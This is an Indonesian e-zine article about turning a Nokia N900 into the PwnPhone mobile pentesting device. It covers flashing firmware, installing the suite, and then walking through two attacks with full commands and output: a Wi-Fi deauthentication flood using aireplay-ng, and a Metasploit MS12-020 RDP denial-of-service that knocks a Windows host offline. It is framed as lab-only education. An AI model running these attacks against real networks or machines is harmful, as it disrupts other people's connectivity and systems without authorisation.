@@ -1,0 +1,455 @@
+ECHO MAGAZINE VOLUME X, ISSUE XXV, PHILE 0x08.TXT
+__________       ______  __       __________________               
+___  ____/__________  / / /______ ____  /___  /___(_)_______ _____ 
+__  __/   _  ___/__  /_/ / _  __ \___  / __  / __  / __  __ \_  _ \
+_  /___   / /__  _  __  /  / /_/ /__  /  _  /___  /  _  / / //  __/
+/_____/   \___/  /_/ /_/   \____/ _  /   /____//_/   /_/ /_/ \___/ 
+                                  /_/
+  Mobile Pentesting Suite : Nokia N900 PwnPhone 
+  Budi Khoirudin
+  http://budi.khoirudin.com
+
+-----[ Disclaimer
+	
+Tulisan ini dibuat untuk tujuan pendidikan apabila pembaca memiliki tujuan
+negatif, berbahaya, atau merugikan harap hentikan membaca dan tutup e-zine
+ini.Segala sesuatu yang saya lakukan disini dilakukan didalam private lab tanpa
+merugikan siapapun.Kepada para pembaca e-zine ini apabila pembaca ingin mencoba
+atau mempraktekan dengan apa yang saya tulis, penulis tidak bertanggung jawab
+atas resiko yang disebabkan dan resiko tersebut ditanggung oleh pembaca
+sendiri.
+	
+-----[ Pendahuluan
+
+Bismillah,
+	
+Pada awalnya saya bingung apa yang akan saya tulis untuk CFP ECHO E-zine kali
+ini, awal saya ingin membawakan materi tentang hardware moding tapi karena saya
+risetnya mood-mood'an (baca: tidak konsisten) jadi tidak saya lanjutkan. Lalu
+saya mendengar issue tentang IDSECCONF 2012 yang akan bertema "Mobile Hacking"
+dari situ saya teringat akan macam-macam bentuk mobile pentesting suite,
+seperti contohnya pada lingkungan ANDROID ada ANTI(Android Network Toolkit)[1],
+Droidsheep[2], Debdroid[3], dan lainnya lalu pada lingkungan IOS (Iphone OS)[4]
+banyak sekali mungkin beberapa tools seperti metasploit, nmap, ettercap
+berjalan dengan baik didalam device ini, dan ada juga yang sudah menyediakan
+repository untuk tools-tools tersebut[5]. Keduanya sudah pernah saya oprek dari
+kedua device tersebut sama-sama memiliki kekurangan salah satunya ialah
+"Wireless Packet Injection". Berangkat dari kekurangan tersebut saya mencoba
+mencari tau, apakah ada mobile phone yang bisa melakukan hal tersebut? ternyata
+ada, ialah Nokia N900 yang memiliki OS maemo 5, namun untuk mengaktifkan hal
+tersebut harus dilakukan beberapa modifikasi[6].Semoga tulisan ini bisa menjadi
+"Kick Starter" pada materi-materi yang akan dipresentasikan oleh para pemateri
+IDSECCONF 2012, :) Cahyo.... 
+	
+Selanjutnya saya melakukan riset lebih lanjut, apakah Nokia N900 tersebut hanya
+sekedar melakukan "Wireless Hacking"? sedangkan OS yang dipakai ialah maemo 5
+yang merupakan base on linux, pasti ada hal lebih yang dapat dilakukan.
+Bagaimana dengan metasploit? apakah bisa berjalan didalam nokia N900? ternyata
+bisa berjalan didalam device ini[7].Bagaimana dengan tools-tools hacking
+lainnya? setelah melakukan pencarian lebih jauh akhirnya saya temukan PwnPhone
+yang dibuat oleh "pwnieexpress"[8] didalam releasenya terdapat 2 versi yaitu
+versi komersil yang sudah dibundle dengan Nokia N900 yang dijual seharga $960
+(Wow mahal bangets untuk handphone jadul keluaran tahun 2009) dan versi
+komunitas yang dapat didownload secara gratis. Perbedaan antara versi komersil
+dan komunitas menurut saya tidak terlalu signifikan dikarenakan lebih kearah
+support dan update[9].
+	
+Dimulailah perburuan Nokia N900, flashback sedikit untuk sekedar sharing
+beberapa waktu lalu saya menjual IPOD 4G serta Netbook ASUS saya, tujuannya
+ialah untuk menabung untuk dapat membeli Macbook Pro, namun ditengah perjalanan
+saya melihat beberapa teman-teman sudah memiliki sertifikasi international dari
+situ saya sadar betapa pentingnya sertifikasi international tersebut. Maksud
+diri ingin ikut pelatihan serta ujian sertifikasi international tersebut namun
+Mood buat oprek Nokia N900 ini lagi menggebu-gebu dan saya ingin berbagi ilmu
+dari apa yang saya oprek ini kepada para pembaca semua, yang pada akhirnya saya
+membeli Nokia N900 tersebut, jadi hargailah mereka yang sudah berkorban banyak
+untuk mendapatkan ilmu lalu dibagikan secara gratis, bukannya untuk dihina,
+direndahkan, dicacimaki, ataupun dengan menyerang orang tersebut.Demikian mari
+kita kembali lagi kebenang merah (gaya OVJ) ...
+
+-----[ Flashing Nokia N900
+
+Nah berhubung saya beli ini alat second atau bekas, jadinya mesti dibuat
+menjadi kondisi awal seperti keluar dari pabrik, biar bersih tidak ada
+bekas-bekas yang tertinggal dari pengguna yang lama yaitu dengan melakukan
+flashing dan ini sangat disarankan oleh pihak pwnieexpress[15].Operating System
+yang saya pakai pada saat melakukan flashing ini ialah windows 7 dan aplikasi
+untuk melakukan flashingnya ialah flasher-3.5 yang dapat di download di
+http://tablets-dev.nokia.com/maemo-dev-env-downloads.php , untuk bagaimana cara
+menginstall flashernya, cukup mudah bagi pengguna windows mungkin hanya tinggal
+mengklik next dan finish.
+
+Berikut ini opsi yang dimiliki oleh flasher-3.5:
+		C:\Program Files\maemo\flasher-3.5>flasher-3.5.exe
+		flasher v2.5.2 (Sep 24 2009)
+
+		Nothing to do!
+		Usage: flasher [OPTIONS]
+		Options:
+		  -F, --fiasco=ARG            Location of a FIASCO image
+		  -k, --kernel=ARG            Location of kernel image
+		  -n, --initfs=ARG            Location of initfs image
+		  -r, --rootfs=ARG            Location of root JFFS2 image
+			  --cmt-2nd=ARG           Location of CMT FIASCO 2nd image
+			  --cmt-algo=ARG          Location of CMT FIASCO algorithm image
+			  --cmt-mcusw=ARG         Location of CMT FIASCO MCUSW image
+			  --cmt-no-verify         Disable verification of CMT programming
+		  -x, --xloader=ARG           Location of X-Loader image
+		  -s, --secondary=ARG         Location of NOLO secondary bootloader image
+		  -2, --2nd=ARG               Location of NOLO cold flasher ("2nd") image
+		  -u, --unpack[=ARG]          Unpack a FIASCO image
+		  -f, --flash                 Load and flash all supplied images
+		  -l, --load                  Only load all supplied images
+		  -b, --boot[=ARG]            Boot the kernel with optional cmdline
+		  -R, --reboot                Reboot the board (e.g. after flashing NOLO)
+		  -i, --read-device-id        Print out the device type
+		  -S, --serial-port=ARG       Serial port used for cold flashing or "usb"
+		  -I, --init-port             Only initialize the serial port
+		  -c, --cold-flash            "Cold flash" the device
+		  -h, --hw-revision=ARG       Specify product code and HW revision
+			  --enable-rd-mode        Enable R&D mode on the device
+			  --disable-rd-mode       Disable R&D mode on the device
+			  --set-rd-flags[=ARG]    Set R&D mode flags on the device
+			  --clear-rd-flags[=ARG]  Clear R&D mode flags on the device
+			  --query-rd-mode         Query the device R&D mode status and flags
+			  --set-hw-revision[=ARG] Set HW revision override on device
+			  --flash-only=ARG        Flash only certain components
+		  -U, --usb-device=ARG        Specify USB device to use (bus:device address)
+	
+    Selanjutnya yang kita lakukan ialah flashing eMMC (embedded MMC) a.k.a
+    *VANILLA*[10].Kegunaan melakukan hal ini ialah untuk membersihkan
+    konten-kontent yang terdapat pada partisi internal memory sebesar 32GB
+    tersebut. sebelum kita mulai melakukan flashing kita download dulu eMMC
+    imagenya di http://tablets-dev.nokia.com/nokia_N900.php lalu ditempatkan di
+    path folder dimana kita menginstall flasher-3.5, secara default path
+    direktorinya ialah "C:\Program Files\maemo\flasher-3.5".selanjutnya kita
+    matikan handphone nokia n900 tersebut, setelah kondisi mati. sebelum kita
+    memasang kabel data yang menghubungkan antara handphone dan pc, kita buka
+    terlebih dahulu command prompt (CMD), pindah ke direktori dimana kita
+    menginstall flasher-3.5 dan ikuti langkah dibawah ini:
+	
+    C:\Program Files\maemo\flasher-3.5>flasher-3.5.exe -F RX-51_2009SE_10.2010.13-2.VANILLA_PR_EMMC_MR0_ARM.bin -f 
+    <---- tekan enter tanpa menghubungkan kabel data antara handphone dan pc
+		flasher v2.5.2 (Sep 24 2009)
+
+		Image 'mmc', size 255947 kB
+				Version RX-51_2009SE_10.2010.13-2.VANILLA
+		Suitable USB device not found, waiting. 
+    <------------- disini kabel data belum dihubungkan antara handphone dan pc
+		USB device found found at bus bus-0, device address \\.\libusb0-0001--0x0421-0x0 
+    <------ nah pada bagian ini, sambil menekan dan menahan tombol "U" pada 
+            keyboard handphone (Nokia N900) kita sambungkan kabel data tersebut 
+            antara handphone dan pc, jangan lepaskan tombol "U" tersebut sampai selesai.
+		105.
+		Found device RX-51, hardware revision 2101
+		NOLO version 1.4.14
+		Version of 'sw-release': RX-51_2009SE_21.2011.38-1_PR_MR0
+		Booting device into flash mode.
+		Suitable USB device not found, waiting.
+		USB device found found at bus bus-0, device address \\.\libusb0-0001--0x0421-0x0
+		1c8.
+		Raw data transfer EP found at EP2.
+		Image(s) flashed successfully in 27.429 s (9331 kB/s)! 
+    <------ nah pada bagian ini yang berarti kita telah berhasil melakukan 
+            flashing eMMC dan barulah kita lepaskan tombol "U" pada keyboard handphone 
+            (Nokia N900) biarkan handphone dalam keadaan mati.
+
+    Okay sebelumnya kita telah berhasil melakukan flashing eMMC lalu yang kita
+    lakukan selanjutnya ialah flashing FIASCO a.k.a *COMBINED*[10] atau
+    rootfs.Kegunaan dari melakukan flashing FIASCO ialah memasang kembali
+    kernel, gsm firmware, bootloader, dan emplementasi dari linux itu
+    sendiri[11] yang menjadikan handphone nokia N900 tersebut kembali ke
+    kondisi awal. Seperti pada saat melakukan flashing eMMC kita terlebih
+    dahulu mendownload file image FIASCO dan ditempatkan di path direktori
+    tempat menginstall flasher-3.5. Apabila kabel data antara handphone dan pc
+    tersambung kita putuskan terlebih dahulu sambungan tersebut lalu ketikan
+    pada command prompt seperti yang tertera dibawah ini:
+		
+    C:\Program Files\maemo\flasher-3.5>flasher-3.5.exe -F RX-51_2009SE_20.2010.36-2_PR_COMBINED_MR0_ARM.bin -f -R
+	flasher v2.5.2 (Sep 24 2009)
+
+	SW version in image: RX-51_2009SE_20.2010.36-2_PR_MR0
+	Image 'kernel', size 1705 kB
+			Version 2.6.28-20103103+0m5
+	Image 'rootfs', size 185728 kB
+			Version RX-51_2009SE_20.2010.36-2_PR_MR0
+	Image 'cmt-2nd', size 81408 bytes
+			Version BB5_09.36
+	<---SNIP--->
+	Dipotong karena kepanjangan
+	<---SNIP--->
+	Image 'xloader', size 14848 bytes
+			Valid for RX-51: 2601, 2602, 2603, 2604, 2605, 2606
+			Version 1.4.14.9+0m5
+	Image 'secondary', size 109440 bytes
+			Valid for RX-51: 2601, 2602, 2603, 2604, 2605, 2606
+			Version 1.4.14.9+0m5
+	Suitable USB device not found, waiting. 
+    <---- disini kabel data antara handphone dan pc belum tersambung
+	USB device found found at bus bus-0, device address \\.\libusb0-0001--0x0421-0x0 
+    <--- sambil menekan dan menahan tombol "U" pada keyboard (Nokia N900) lalu 
+         sambungkan kabel data tersebut yang menghubungkan antara pc dan handphone
+	105.
+	Found device RX-51, hardware revision 2101
+	NOLO version 1.4.14
+	Version of 'sw-release': RX-51_2009SE_21.2011.38-1_PR_MR0
+	Sending xloader image (14 kB)...
+	100% (14 of 14 kB, avg. 2900 kB/s)
+	Sending secondary image (106 kB)...
+	100% (106 of 106 kB, avg. 10687 kB/s)
+	Flashing bootloader... done.
+	<---SNIP--->
+	Dipotong karena kepanjangan
+	<---SNIP--->
+	Sending and flashing rootfs image (185728 kB)...
+	100% (185728 of 185728 kB, avg. 12228 kB/s)
+	Finishing flashing... done
+	CMT flashed successfully 
+
+	C:\Program Files\maemo\flasher-3.5>
+	
+    Akhirnya kita berhasil melakukan flashing Nokia N900, biarkan handphone
+    melakukan reboot karena kita sebelumnya sudah memberikan opsi "-R" yang
+    berarti reboot setelah selesai.
+	
+-----[ Installasi PwnPhone
+
+    Setelah kita berhasil melakukan flashing, yang kita lakukan selanjutnya
+    ialah melakukan instalasi bundle PwnPhone tersebut kedalam Nokia
+    N900.Bundle Pwnphone versi komunitas tersebut dapat didownload di
+    http://pwnieexpress.com/downloads.html. untuk instruksi instalasi sudah
+    disediakan oleh pwnieexpress yang terdapat disini
+    http://pwnieexpress.com/support/pwnphone_community_install.txt pembaca
+    tinggal mengikutinya saja, saran dari saya pastikan baterai handphone
+    terisi penuh, mungkin pada saat instalasi PwnPhone ini seolah-olah
+    handphone kita hang atau crash namun sebenarnya saat itu sedang melakukan
+    proses dan selanjutnya janganlah melakukan upgrade pada kernel power
+    tersebut ke versi yang lebih tinggi dikarenakan dapat menghilangkan fitur
+    "packet injection", defaultnya adalah kernel power versi 46.
+
+-----[ PwnPhone In Action
+	
+    Banyak sekali tools-tools[12] yang disediakan oleh PwnPhone beberapa
+    diantara ialah:
+    
+    - Metasploit, Fasttrack, SET, Scapy, Nikto, SSLstrip, iodine
+    - Kismet, Aircrack-NG, Wifite, Wifizoo, GrimWEPa, Wepbuster
+    - Nmap, netcat, tcpdump, wireshark, tshark, Ettercap-NG, exploitDB,
+      macchanger
+    - presencevnc client, x11vnc server, conky, tor, rdesktop, openvpn, netmon,
+      iptables
+	
+    Salah satu bentuk emplementasi dari packet injection ialah deauth
+    packet[14], bagaimana cara melakukannya dengan Nokia N900 yang sudah
+    terpasang PwnPhone? berikut POCnya:
+	
+    - Mengaktifkan Mode Monitor dengan klik icon "orang pakai kacamata" /
+      monitor_on_off nanti akan keluar status "Monitor mode ENABLED!"
+    - Mengaktifkan Packet Injection dengan klik icon "suntikan dengan
+      background warna putih" / Injection_ON nanti akan keluar status
+      "Injection is enabled );"
+    - Klik Icon X-terminal selanjutnya ikuti langkah dibawah ini:
+	
+	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
+	Enter 'help' for a list of built-in commands.
+	
+	~ $ root
+	
+	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
+	Enter 'help' for a list of built-in commands.
+
+	Nokia-N900:~# id
+	uid=0(root) gid=0(root) groups=0(root),20(dialout),29(audio),44(video),670(pulse-access)
+	Nokia-N900:~# uname -a
+	Linux Nokia-N900 2.6.28.10power46-wl1 #1 PREEMPT Sun Dec 19 20:51:27 CET 2010 armv7l GNU/Linux
+
+	- Melakukan monitoring 
+		Nokia-N900:~# airodump-ng mon0
+		
+		CH  2 ][ Elapsed: 28 s ][ 2012-03-23 09:10
+
+		BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+		F4:C7:14:XX:XX:XX  -59      153     5856  212   6  54e  OPN              AndroidAP
+
+		BSSID              STATION            PWR   Rate    Lost  Packets  Probes
+
+		F4:C7:14:XX:XX:XX  EC:9B:5B:XX:XX:XX    0   48e- 0e     1     2971
+		F4:C7:14:XX:XX:XX  4C:ED:DE:XX:XX:XX  -58   54e-54e    21     3104
+		
+        Dari sini dapat kita lihat terdapat 1 AP (Access Point) dengan 2 client
+        yang terhubung. close aplikasi tersebut CTRL + C
+		
+	- Testing apakah Injection dapat dilakukan?
+		Nokia-N900:~# aireplay-ng --test -a F4:C7:14:17:C5:E6 wlan0
+		10:00:35  Waiting for beacon frame (BSSID: F4:C7:14:17:C5:E6) on channel 6
+		10:00:35  Trying broadcast probe requests...
+		10:00:35  Injection is working!
+		10:00:37  Found 1 AP 
+
+		10:00:37  Trying directed probe requests...
+		10:00:37  F4:C7:14:17:C5:E6 - channel: 6 - 'AndroidAP'
+		10:00:37  Ping (min/avg/max): 1.496ms/10.387ms/41.168ms Power: -56.93
+		10:00:37  30/30: 100%
+	
+	- Deauth Packet In Action:
+		Nokia-N900:~# aireplay-ng --deauth 10 -a F4:C7:14:17:C5:E6 wlan0 
+		10:01:26  Waiting for beacon frame (BSSID: F4:C7:14:17:C5:E6) on channel 6
+		NB: this attack is more effective when targeting
+		a connected wireless client (-c <client's mac>).
+		10:01:26  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:26  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:27  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:27  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:28  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:28  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:29  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:29  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:30  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		10:01:30  Sending DeAuth to broadcast -- BSSID: [F4:C7:14:17:C5:E6]
+		
+    - Menonaktifkan Mode Monitor dengan klik icon "orang pakai kacamata" /
+      monitor_on_off nanti akan keluar status "Monitor mode DISABLED!"
+	
+    - Menonaktifkan Packet Injection dengan klik icon "suntikan dengan
+      background warna hitam" / Injection_OFF nanti akan keluar status "Turning
+      Injection Off,Injection is disabled );"
+	
+    Aksi lainnya melakukan exploitasi dengan metasploit yang terdapat pada
+    Nokia N900 PwnPhone ini.Berhubung beberapa waktu lalu sedang marak-maraknya
+    issue tentang kelemahan yang terdapat pada fitur RDP yang dimiliki oleh
+    mesin Windows yaitu MS12-020 / CVE-2012-0002 maka dari itu bermunculanlah
+    bentuk POC yang menyebabkan target menjadi BSOD (Blue Screen Of Death) dan
+    Team dari metasploit itu sendiri telah berhasil melakukan porting bentuk
+    POC tersebut menjadi module yang terdapat pada metasploit. Sedikit info
+    pada saat tulisan ini dibuat pihak metasploit akan memberikan hadiah berupa
+    uang kurang lebih sebesar $15000[13] bagi siapapun yang dapat membuat
+    module exploit yang menghasilkan RCE (Remote Code Execution) pada kelemahan
+    tersebut.Baiklah sekarang kita coba emplementasikan metasploit dengan
+    menggunakan module DOS sebagai bentuk emplementasi dari kelemahan tersebut,
+    mari kita coba pada Nokia N900 PwnPhone, berikut POCnya: Klik Icon
+    X-terminal selanjutnya ikuti langkah dibawah ini:
+	
+	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
+	Enter 'help' for a list of built-in commands.
+	
+	~ $ root
+	
+	BusyBox v1.19.2 (Debian 1.19.2power1) built-in shell (ash)
+	Enter 'help' for a list of built-in commands.
+
+	Nokia-N900:~# id
+	uid=0(root) gid=0(root) groups=0(root),20(dialout),29(audio),44(video),670(pulse-access)
+	Nokia-N900:~# uname -a
+	Linux Nokia-N900 2.6.28.10power46-wl1 #1 PREEMPT Sun Dec 19 20:51:27 CET 2010 armv7l GNU/Linux
+	Nokia-N900:~# ls
+	Nokia-N900:~# pwd
+	/root
+	Nokia-N900:~# cd /home/user/MyDocs/pwnphone/msf3/
+	Nokia-N900:/home/user/MyDocs/pwnphone/msf3#
+	Nokia-N900:/home/user/MyDocs/pwnphone/msf3# ruby msfconsole
+	 _                                                      _
+	/  \  / \        __                          _   __    /_/ __
+	| |\ /  | _____  \ \            ___   _____ | | /   \  _   \ \
+	| | \/| | | ___\ |- -|   /\    / __\ | -__/ | | | |  || | |- -|
+	|_|   | | | _|__  | |_  / -\ __\ \   | |    | |_ \__/ | |  | |_
+		  |/  |____/  \___\/ /\  \___/   \/      \__|     |_\  \___\
+
+
+		   =[ metasploit v4.3.0-dev [core:4.3 api:1.0]
+	+ -- --=[ 818 exploits - 458 auxiliary - 138 post
+	+ -- --=[ 249 payloads - 27 encoders - 8 nops
+
+	msf > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+	msf  auxiliary(ms12_020_maxchannelids) > show options
+
+	Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):
+
+	   Name   Current Setting  Required  Description
+	   ----   ---------------  --------  -----------
+	   RHOST                   yes       The target address
+	   RPORT  3389             yes       The target port
+
+	msf  auxiliary(ms12_020_maxchannelids) > nmap -v -sT -O -p 3389 192.168.43.165
+	[*] exec: nmap -v -sT -O -p 3389 192.168.43.165
+
+
+	Starting Nmap 5.50 ( http://nmap.org ) at 2012-03-23 08:56 WIT
+	Initiating ARP Ping Scan at 08:56
+	Scanning 192.168.43.165 [1 port]
+	Completed ARP Ping Scan at 08:56, 0.05s elapsed (1 total hosts)
+	Initiating Parallel DNS resolution of 1 host. at 08:56
+	Completed Parallel DNS resolution of 1 host. at 08:56, 0.01s elapsed
+	Initiating Connect Scan at 08:56
+	Scanning 192.168.43.165 [1 port]
+	Discovered open port 3389/tcp on 192.168.43.165
+	Completed Connect Scan at 08:56, 0.01s elapsed (1 total ports)
+	Initiating OS detection (try #1) against 192.168.43.165
+	Nmap scan report for 192.168.43.165
+	Host is up (0.052s latency).
+	PORT     STATE SERVICE
+	3389/tcp open  ms-term-serv
+	MAC Address: 4C:ED:DE:XX:XX:XX (Unknown)
+	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+	Device type: general purpose
+	Running: Microsoft Windows XP|2003
+	OS details: Microsoft Windows XP SP2 or Server 2003 SP1 or SP2
+	Network Distance: 1 hop
+	TCP Sequence Prediction: Difficulty=261 (Good luck!)
+	IP ID Sequence Generation: Incremental
+
+	Read data files from: /usr/share/nmap
+	OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 6.32 seconds
+			   Raw packets sent: 17 (1.446KB) | Rcvd: 17 (1.222KB)
+	msf  auxiliary(ms12_020_maxchannelids) > set RHOST 192.168.43.165
+	RHOST => 192.168.43.165
+	msf  auxiliary(ms12_020_maxchannelids) > show options
+
+	Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):
+
+	   Name   Current Setting  Required  Description
+	   ----   ---------------  --------  -----------
+	   RHOST  192.168.43.165   yes       The target address
+	   RPORT  3389             yes       The target port
+
+	msf  auxiliary(ms12_020_maxchannelids) > run
+
+	[*] 192.168.43.165:3389 - Sending MS12-002 Microsoft Remote Desktop Use-After-Free DoS
+	[*] 192.168.43.165:3389 - 210 bytes sent
+	[*] 192.168.43.165:3389 - Checking RDP status...
+	[+] 192.168.43.165:3389 seems down
+	[*] Auxiliary module execution completed
+	msf  auxiliary(ms12_020_maxchannelids) >
+
+    Alhamdulilah, demikianlah tulisan ini saya buat semoga dapat bermanfaat
+    buat para pembaca yang budiman, apabila ada kekurangan dan kata-kata yang
+    kurang berkenan maafkanlah saya, saya hanya manusia biasa yang tak luput
+    dari kesalahan. Well, sampai ketemu lagi ...
+	
+-----[ Shouts
+	
+	- Allah SWT, nabi beserta rasulnya
+	- Member JKT48, AKB48, dan Cherrybelle
+	- Nyubicrew : Nyubi, Matdhule, Bius, Parcom, Awie dan semua Crew
+	- ECHO : Om Hero, Ammar, Dedi, Om Mulyadi, Azis, Tenro dan semua Member
+	- RNDC, Antihackerlink : Om Arip SakitJiwa, Murray, Arif Dewae, Kendi,
+      	  Faco, Admin AHREPOST dan teman-teman semua
+    	- Buat kalian Gadis Kawaii dimanapun kalian berada
+	
+-----[ Referensi
+	
+	1. http://zimperium.com/Android_Network_Toolkit.html
+	2. http://droidsheep.de/
+	3. http://gitbrew.org/debdroid/
+	4. http://kecoak.org/log/2010/12/21/iphone4-network-hacking-arsenal-in-your-pocket/
+	5. http://ininjas.com/forum/index.php
+	6. http://www.neopwn.com/
+	7. https://community.rapid7.com/docs/DOC-1295
+	9. http://pwnieexpress.com/downloads.html
+	10. http://wiki.maemo.org/Updating_the_tablet_firmware#Updating_.26_Flashing_your_device
+	11. http://wiki.maemo.org/Updating_the_tablet_firmware#What_does_it_do.3F
+	12. http://pwnieexpress.com/pdfs/pwnphonemanual.pdf
+	13. http://gun.io/open/48/metasploit-module-for-cve-2012-002
+	14. http://www.aircrack-ng.org/doku.php?id=deauthentication
+	15. http://pwnieexpress.com/support/pwnphone_community_install.txt
